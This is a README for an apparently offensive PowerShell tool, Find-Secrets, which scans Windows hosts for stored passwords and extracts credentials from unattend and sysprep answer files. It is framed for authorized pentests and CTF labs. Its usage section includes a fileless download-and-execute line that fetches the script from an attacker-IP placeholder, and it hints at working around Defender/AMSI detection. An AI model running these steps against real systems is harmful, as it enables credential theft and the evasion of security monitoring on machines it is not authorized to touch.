# Find-Secrets

PowerShell post-exploitation helper for Windows privesc: recursively scans a host
for **secrets that are actually assigned a value** (`keyword = value`, not just
mentioned in prose or code), and includes a dedicated **unattend / autounattend /
sysprep answer-file parser** that pulls usernames and passwords straight out of
the XML.

> **Status: v0.1.1 — early release, NOT thoroughly tested.**
> Validated only against a couple of lab environments (HTB EscapeTwo, HTB Academy
> Windows Privesc). Expect false positives and answer-file layouts it doesn't yet
> handle. **Always review the output — don't trust it blindly.**

---

## What it does

- **`Find-Secrets`** — recursive keyword scanner across configs, scripts, logs,
  etc. Smart mode requires an assignment (`=`/`:`) after the keyword and filters
  out variable-reference noise, doc placeholders, and prose false-positives.
  Writes a context report to a file.
- **`Get-UnattendSecrets`** — namespace-aware parser for Windows answer files.
  Extracts credentials from `AutoLogon`, `AdministratorPassword`, `LocalAccount`,
  `DomainAccount`, `Credentials` (domain-join) and `UserData/FullName`, and
  decodes Base64 "obfuscated" (`PlainText=false`) passwords. Callable on its own,
  and invoked **automatically** by `Find-Secrets` whenever a scan hits an answer
  file.

## Requirements

- Windows PowerShell 2.0+ (no external modules).

## Usage

Dot-source the script, then call a function (loading it alone runs nothing):

```powershell
. .\Find-Secrets.ps1

# full host scan -> report file
Find-Secrets -Path "C:\" -OutFile "C:\Windows\Temp\hits.txt"

# parse a single answer file (structured objects)
Get-UnattendSecrets -Path .\unattend.xml | Format-Table

# looser mode: any keyword mention, no assignment/quote filtering
Find-Secrets -Path "C:\" -Loose
```

In-memory / no file on disk (use a writable temp path for the report):

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Find-Secrets.ps1')
Find-Secrets -Path "C:\" -OutFile "$env:TEMP\hits.txt"
```

## Configuration

All tunables (scan root, keywords, extensions, exclude paths, file-size cap, the
answer-file filename pattern, ...) live in the **CONFIG block at the top of the
script**, each with a one-line description. Edit those defaults once, or override
any of them per-call via the matching parameter.

## Notes

- **Partial capture by design.** `Find-Secrets` does not copy whole files into
  the report. For each hit it records only a **context window** around the match
  (`-Context`, default 50 chars each side) and the captured value is
  **length-capped** (~80 chars). So a long secret, private key, or connection
  string may be **truncated** in the report — treat each hit as a *pointer* to
  the file/location, then open the source file to read the full value.
  (The `Get-UnattendSecrets` parser is the exception: it extracts complete
  username/password values from answer files.)
- A script named `Find-Secrets` that greps for passwords may trip Defender/AMSI
  in some environments — the remote `IEX` path especially. Adjust as needed.

## Authorized use only

For use in engagements you are **explicitly authorized** to test (pentests, CTFs,
your own labs). You are responsible for how you use it.
